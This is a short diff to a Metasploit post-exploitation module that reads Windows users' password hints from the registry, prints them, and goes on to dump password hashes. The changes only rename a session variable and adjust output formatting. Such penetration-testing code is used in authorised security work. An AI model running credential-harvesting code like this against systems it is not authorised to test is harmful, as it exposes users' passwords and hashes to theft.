@@ -163,7 +163,7 @@ class Metasploit3 < Msf::Post
 			#Attempt to get Hints (from WinXP Location) only if it's not set yet
 			if users[rid][:UserPasswordHint].nil?	
 				begin
-					uk_hint = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
+					uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
 					users[rid][:UserPasswordHint] = uk_hint.query_value("").data
 				rescue ::Rex::Post::Meterpreter::RequestError
 					users[rid][:UserPasswordHint] = nil
@@ -307,11 +307,11 @@ class Metasploit3 < Msf::Post
 			users.keys.sort{|a,b| a<=>b}.each do |rid|
 				#If we have a hint then print it
 				if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
-					print_good("#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\"")
+					print_good("\t#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\"")
 					hint_count += 1
 				end	
 			end
-			print_good("No users with password hints on this system") if hint_count == 0
+			print_good("\tNo users with password hints on this system") if hint_count == 0
 
 			print_status("\tDumping password hashes...")
 			users.keys.sort{|a,b| a<=>b}.each do |rid|
